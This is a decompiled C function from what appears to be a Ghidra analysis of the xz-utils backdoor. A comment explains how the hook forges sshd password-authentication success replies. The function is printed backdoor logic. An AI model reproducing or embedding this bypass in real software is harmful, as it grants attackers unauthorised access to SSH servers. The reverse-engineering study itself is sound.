// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_hook.c
// Function: mm_answer_authpassword_hook @ 0x108100
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_authpassword_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Responds to MONITOR_REQ_AUTHPASSWORD by either replaying the canned buffer stored in the
 * global payload context or synthesising a minimal success packet on the fly. The hook emits the
 * reply through fd_write(), mirrors sshd's bookkeeping by updating the monitor context at
 * lVar1+0xa0, and returns 1 so the monitor thread believes password authentication succeeded
 * without ever consulting sshd.
 */
#include "xzre_types.h"


int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *funcs;
  long lVar1;
  int iVar2;
  size_t count;
  libc_imports_t **buffer;
  uint *auth_reply;
  sshd_payload_ctx_t *payload_ctx;
  libc_imports_t *libc_imports;
  undefined1 uStack_d;
  undefined4 uStack_c;
  
  *(uint *)&libc_imports = 0;
  funcs = *(libc_imports_t **)(global_ctx + 0x10);
  lVar1 = *(long *)(global_ctx + 0x20);
  *(uint *)((u8 *)&libc_imports + 4) = 0;
  uStack_d = 0;
  uStack_c = 0;
  if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
    if ((funcs != (libc_imports_t *)0x0) && (funcs->exit != (pfn_exit_t)0x0)) {
      (*funcs->exit)(0);
    }
    iVar2 = 0;
  }
  else {
    count = (size_t)*(ushort *)(lVar1 + 0x90);
    if ((*(ushort *)(lVar1 + 0x90) == 0) ||
       (buffer = *(libc_imports_t ***)(lVar1 + 0x98), buffer == (libc_imports_t **)0x0)) {
      buffer = &libc_imports;
      uStack_d = 1;
      *(uint *)((u8 *)&libc_imports + 4) = *(uint *)(lVar1 + 0x40) & 0xff;
      *(uint *)&libc_imports = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      count = (ulong)((uint)libc_imports >> 0x18) + 4;
    }
    fd_write(sock,buffer,count,funcs);
    **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
    iVar2 = 1;
  }
  return iVar2;
}

